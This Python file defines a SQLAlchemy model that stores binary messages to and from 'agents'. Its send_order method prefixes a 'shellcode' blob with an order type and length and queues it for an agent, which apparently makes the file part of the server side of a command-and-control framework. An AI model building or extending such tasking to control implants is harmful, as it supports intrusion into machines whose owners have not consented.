from models.basemodel import Base, db
from sqlalchemy.sql import func
import struct

class Line(Base):
    __tablename__ = "lines"
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(255), db.ForeignKey("agents.id"), nullable=False)
    content = db.Column(db.LargeBinary, nullable=False)
    timestamp = db.Column(db.DateTime(timezone=True), server_default=func.now(), nullable=False)
    incoming = db.Column(db.Boolean, nullable=False, default=False)

    def to_dict(self):
        return {
            "id": self.id,
            "agent_id": self.agent_id,
            "content": self.content,
            "timestamp": self.timestamp.isoformat() if self.timestamp else None,
            "incoming": self.incoming,
        }
    
    @classmethod
    def by_agent_incoming_after(cls, agent_id: str, last_id: int = 0):
        db.session.remove()
        return (
            cls.query
            .filter(
                cls.agent_id == agent_id,
                cls.incoming == 1,
                cls.id > last_id,
            )
            .order_by(cls.id.asc())
            .all()
        )
    @classmethod
    def by_agent_outgoing_after(cls, agent_id: str, last_id: int = 0):
        db.session.remove()
        return (
            cls.query
            .filter(
                cls.agent_id == agent_id,
                cls.incoming == 0,
                cls.id > last_id,
            )
            .order_by(cls.id.asc())
            .all()
        )

    @classmethod
    def create_for_agent(cls, agent_id: str, content: str, incoming: bool):
        line = cls(agent_id=agent_id, content=content, incoming=incoming)
        db.session.add(line)
        db.session.commit()
        return line

    @classmethod
    def send_order(cls, agent_id, order_type, shellcode):
        shellcode = order_type + struct.pack('<I', len(shellcode)) + shellcode
        cls.create_for_agent(agent_id, shellcode, incoming=False)

    def __init__(self, agent_id, content, incoming=False):
        self.agent_id = agent_id
        self.content = content
        self.incoming = incoming